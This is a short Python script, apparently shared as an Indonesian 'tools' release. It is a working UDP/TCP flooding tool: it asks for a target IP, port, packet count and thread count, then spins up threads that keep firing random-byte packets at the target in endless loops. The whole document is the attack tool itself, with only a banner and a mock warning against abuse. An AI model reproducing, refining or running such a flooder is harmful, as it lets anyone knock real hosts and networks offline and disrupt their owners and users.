#Collab....
import random
import socket
import threading

print('''──────◆ SALAM DARI BINJAI TOOLS ◆──────''')
print('''➤ AUTHOR : NATHAN X NATTA DXD''')
print('''➤ JANGAN ABUSE YA ADIK ADIK''')
print('''➤ RENAME GW TAMPOL,IZIN DULU ANJ''')
print('''➤ DAH GITU AJA SALAM DARI BINJAI''')
print('''───────────────────◆◆───────────────────''')

ip = str(input("IP NGAB:"))
port = int(input("PORT NYA LUR:"))
times = int(input("PAKET MAU BERAPA:"))
threads = int(input("JUMLAH BARANG NYA NGAB:"))
choice = str(input("GAS KEN ORA ? (y or n):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("🙏 SALAM DARI BINJAI 🙏")
		except:
			print("!! NATHAN X NATTA DXD !!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("🙏 SALAM DARI BINJAI 🙏")
		except:
			s.close()
			print("!! NATHAN X NATTA DXD !!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
